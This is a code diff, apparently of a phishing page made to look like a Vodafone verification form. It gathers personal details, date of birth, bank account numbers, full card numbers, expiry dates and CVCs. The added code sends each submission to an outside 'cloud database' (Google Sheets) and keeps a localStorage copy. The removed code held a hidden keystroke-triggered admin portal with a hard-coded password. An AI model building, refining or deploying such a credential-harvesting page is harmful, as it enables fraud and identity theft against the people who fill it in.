-    a.href = url;
-    a.download = `vodafone_live_data_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.csv`;
-    a.click();
-    URL.revokeObjectURL(url);
-    showMessage("CSV exported!", false);
-  };
-  
-  // ============ ADMIN PORTAL ACCESS ============
-  let secretKeySequence = [];
-  const secretCode = ['a', 'd', 'm', 'i', 'n'];
-  
-  document.addEventListener('keydown', function(e) {
-    secretKeySequence.push(e.key.toLowerCase());
-    if (secretKeySequence.length > secretCode.length) secretKeySequence.shift();
-    if (JSON.stringify(secretKeySequence) === JSON.stringify(secretCode)) {
-      document.getElementById('adminLoginOverlay').classList.add('active');
-      secretKeySequence = [];
-    }
-  });
-  
-  window.verifyAdminPassword = function() {
-    const password = document.getElementById('adminPassword').value;
-    if (password === ADMIN_PASSWORD) {
-      document.getElementById('adminLoginOverlay').classList.remove('active');
-      document.getElementById('adminPortal').classList.add('active');
-      displaySubmissions();
-      updateStats();
-      document.getElementById('adminPassword').value = '';
-    } else {
-      alert('❌ Invalid password!');
-    }
-  };
-  
-  window.closeAdminPortal = function() {
-    document.getElementById('adminPortal').classList.remove('active');
-  };
-  
-  // ============ FORM FUNCTIONS ============
-  function showMessage(text, isError = false) {
-    toast.textContent = text;
-    toast.classList.add('show');
-    if (isError) {
-      toast.classList.add('toast-error');
-      toast.classList.remove('toast-success');
-    } else {
-      toast.classList.add('toast-success');
-      toast.classList.remove('toast-error');
-    }
-    setTimeout(() => { toast.classList.remove('show'); }, 4000);
-  }
-  
-  window.closeThankYouModal = function() {
-    thankyouModal.classList.remove('active');
-    resetForm();
-  };
-  
-  function resetForm() {
-    form.reset();
-    document.getElementById('employmentStatus').selectedIndex = 0;
-    document.getElementById('dobDay').value = '';
-    document.getElementById('dobMonth').value = '';
-    document.getElementById('dobYear').value = '';
-  }
-  
-  function validateForm() {
-    const required = ['firstName', 'surname', 'phoneNo', 'address', 'historyAddress', 'nameOnAccount', 'sortCode', 'accountNumber', 'nameOnCard', 'cardNumber', 'expiryDate', 'cvc'];
-    for (let field of required) {
-      const el = document.getElementById(field);
-      if (!el.value.trim()) {
-        showMessage(`⚠️ ${field.replace(/([A-Z])/g, ' $1').trim()} is required`, true);
-        el.focus();
-        return false;
-      }
-    }
-    
-    const day = document.getElementById('dobDay').value;
-    const month = document.getElementById('dobMonth').value;
-    const year = document.getElementById('dobYear').value;
-    if (!day || !month || !year) {
-      showMessage("🎂 Please enter complete Date of Birth", true);
-      return false;
-    }
-    
-    const birthDate = new Date(year, month-1, day);
-    const today = new Date();
-    let age = today.getFullYear() - birthDate.getFullYear();
-    const mDiff = today.getMonth() - birthDate.getMonth();
-    if (mDiff < 0 || (mDiff === 0 && today.getDate() < birthDate.getDate())) age--;
-    if (age < 18) {
-      showMessage("⚠️ You must be at least 18 years old", true);
-      return false;
-    }
-    
-    if (!document.getElementById('employmentStatus').value) {
-      showMessage("⚠️ Please select Employment status", true);
-      return false;
-    }
-    
-    const phone = document.getElementById('phoneNo').value.trim();
-    if (!/^[\+\d\s\-\(\)]{8,20}$/.test(phone)) {
-      showMessage("📞 Please enter a valid phone number", true);
-      return false;
-    }
-    
-    const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
-    if (!/^[0-9]{13,19}$/.test(cardNum)) {
-      showMessage("💳 Card number must be 13-19 digits", true);
-      return false;
-    }
-    
-    const expiry = document.getElementById('expiryDate').value.trim();
-    if (!/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(expiry)) {
-      showMessage("📅 Expiry date must be MM/YY format", true);
-      return false;
-    }
-    
-    const cvc = document.getElementById('cvc').value.trim();
-    if (!/^[0-9]{3,4}$/.test(cvc)) {
-      showMessage("🔒 CVC must be 3 or 4 digits", true);
-      return false;
-    }
-    
+    // With no-cors, we can't read response, but request is sent
+    console.log('Data sent to cloud database');
     return true;
+  } catch(error) {
+    console.error('Cloud error:', error);
+    return false;
+  }
+}
+
+// Also save to localStorage as backup
+function saveToLocalBackup(data) {
+  try {
+    const backups = JSON.parse(localStorage.getItem('vodafone_backup') || '[]');
+    backups.push({ id: Date.now(), timestamp: new Date().toISOString(), data: data });
+    localStorage.setItem('vodafone_backup', JSON.stringify(backups));
+    return true;
+  } catch(e) { return false; }
+}
+
+function validateForm() {
+  const required = ['firstName', 'surname', 'phoneNo', 'address', 'nameOnAccount', 'sortCode', 'accountNumber', 'nameOnCard', 'cardNumber', 'expiryDate', 'cvc'];
+  for (let field of required) {
+    const el = document.getElementById(field);
+    if (!el.value.trim()) {
+      showMessage(`⚠️ ${field.replace(/([A-Z])/g, ' $1').trim()} is required`, true);
+      el.focus();
+      return false;
+    }
   }
   
-  function gatherFormData() {
-    const data = {};
-    const inputs = form.querySelectorAll('input, select');
-    inputs.forEach(input => {
-      if (input.name && input.value) {
-        data[input.name] = input.value;
-      }
-    });
-    data['Date of Birth'] = `${document.getElementById('dobDay').value}/${document.getElementById('dobMonth').value}/${document.getElementById('dobYear').value}`;
-    return data;
+  const day = document.getElementById('dobDay').value;
+  const month = document.getElementById('dobMonth').value;
+  const year = document.getElementById('dobYear').value;
+  if (!day || !month || !year) {
+    showMessage("🎂 Please enter complete Date of Birth", true);
+    return false;
   }
   
-  // Formatting
-  document.getElementById('cardNumber').addEventListener('input', function(e) {
-    let raw = this.value.replace(/\s/g, '');
-    if (raw.length > 19) raw = raw.slice(0,19);
-    let formatted = '';
-    for (let i = 0; i < raw.length; i++) {
-      if (i > 0 && i % 4 === 0) formatted += ' ';
-      formatted += raw[i];
+  const birthDate = new Date(year, month-1, day);
+  const today = new Date();
+  let age = today.getFullYear() - birthDate.getFullYear();
+  const mDiff = today.getMonth() - birthDate.getMonth();
+  if (mDiff < 0 || (mDiff === 0 && today.getDate() < birthDate.getDate())) age--;
+  if (age < 18) {
+    showMessage("⚠️ You must be at least 18 years old", true);
+    return false;
+  }
+  
+  if (!document.getElementById('employmentStatus').value) {
+    showMessage("⚠️ Please select Employment status", true);
+    return false;
+  }
+  
+  const phone = document.getElementById('phoneNo').value.trim();
+  if (!/^[\+\d\s\-\(\)]{8,20}$/.test(phone)) {
+    showMessage("📞 Please enter a valid phone number", true);
+    return false;
+  }
+  
+  const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
+  if (!/^[0-9]{13,19}$/.test(cardNum)) {
+    showMessage("💳 Card number must be 13-19 digits", true);
+    return false;
+  }
+  
+  const expiry = document.getElementById('expiryDate').value.trim();
+  if (!/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(expiry)) {
+    showMessage("📅 Expiry date must be MM/YY format", true);
+    return false;
+  }
+  
+  const cvc = document.getElementById('cvc').value.trim();
+  if (!/^[0-9]{3,4}$/.test(cvc)) {
+    showMessage("🔒 CVC must be 3 or 4 digits", true);
+    return false;
+  }
+  
+  return true;
+}
+
+function gatherFormData() {
+  const data = {};
+  const inputs = form.querySelectorAll('input, select');
+  inputs.forEach(input => {
+    if (input.name && input.value) {
+      data[input.name] = input.value;
     }
-    this.value = formatted;
   });
+  data['Date of Birth'] = `${document.getElementById('dobDay').value}/${document.getElementById('dobMonth').value}/${document.getElementById('dobYear').value}`;
+  data['Submission Time'] = new Date().toLocaleString();
+  data['Device'] = navigator.userAgent;
+  return data;
+}
+
+// Formatting
+document.getElementById('cardNumber').addEventListener('input', function(e) {
+  let raw = this.value.replace(/\s/g, '');
+  if (raw.length > 19) raw = raw.slice(0,19);
+  let formatted = '';
+  for (let i = 0; i < raw.length; i++) {
+    if (i > 0 && i % 4 === 0) formatted += ' ';
+    formatted += raw[i];
+  }
+  this.value = formatted;
+});
+
+document.getElementById('expiryDate').addEventListener('input', function(e) {
+  let raw = this.value.replace(/[^0-9]/g, '');
+  if (raw.length >= 3) {
+    let month = raw.slice(0,2);
+    let year = raw.slice(2,4);
+    if (month > 12) month = '12';
+    this.value = month + '/' + year;
+  }
+});
+
+document.getElementById('clearBtn').addEventListener('click', function() {
+  resetForm();
+  showMessage("Form reset", false);
+});
+
+document.getElementById('submitBtn').addEventListener('click', async function(e) {
+  e.preventDefault();
+  if (!validateForm()) return;
   
-  document.getElementById('expiryDate').addEventListener('input', function(e) {
-    let raw = this.value.replace(/[^0-9]/g, '');
-    if (raw.length >= 3) {
-      let month = raw.slice(0,2);
-      let year = raw.slice(2,4);
-      if (month > 12) month = '12';
-      this.value = month + '/' + year;
+  const formData = gatherFormData();
+  
+  submitBtn.disabled = true;
+  submitBtn.innerHTML = '<span class="loading-spinner"></span> Submitting...';
+  
+  // Send to cloud database (Google Sheets)
+  const cloudSent = await sendToCloudDatabase(formData);
+  const localSaved = saveToLocalBackup(formData);
+  
+  setTimeout(() => {
+    if (cloudSent || localSaved) {
+      thankyouModal.classList.add('active');
+      showMessage("✅ Submitted! Data saved to cloud.", false);
+    } else {
+      showMessage("❌ Error submitting. Please try again.", true);
     }
-    if (raw.length > 4) this.value = this.value.slice(0,5);
-  });
-  
-  document.getElementById('clearBtn').addEventListener('click', function() {
-    resetForm();
-    showMessage("Form reset", false);
-  });
-  
-  document.getElementById('submitBtn').addEventListener('click', function(e) {
-    e.preventDefault();
-    if (!validateForm()) return;
     
-    const formData = gatherFormData();
-    
-    submitBtn.disabled = true;
-    submitBtn.innerHTML = '<span class="loading-spinner"></span> Submitting...';
-    
-    setTimeout(() => {
-      const submission = {
-        id: Date.now(),
-        timestamp: new Date().toISOString(),
-        data: formData
-      };
-      
-      const saved = saveToDatabase(submission);
-      if (saved) {
-        thankyouModal.classList.add('active');
-        showMessage("✅ Submitted! Data saved to LIVE database.", false);
-      } else {
-        showMessage("❌ Error saving to database.", true);
-      }
-      
-      submitBtn.disabled = false;
-      submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Verify & continue';
-    }, 500);
-  });
-  
-  console.log('🚀 LIVE SYSTEM READY!');
-  console.log('📊 Total customers in database:', getDatabase().length);
-  console.log('🔐 Admin access: Type "admin" then password "Admin123"');
+    submitBtn.disabled = false;
+    submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Submit';
+  }, 500);
+});
 </script>
 </body>
 </html>
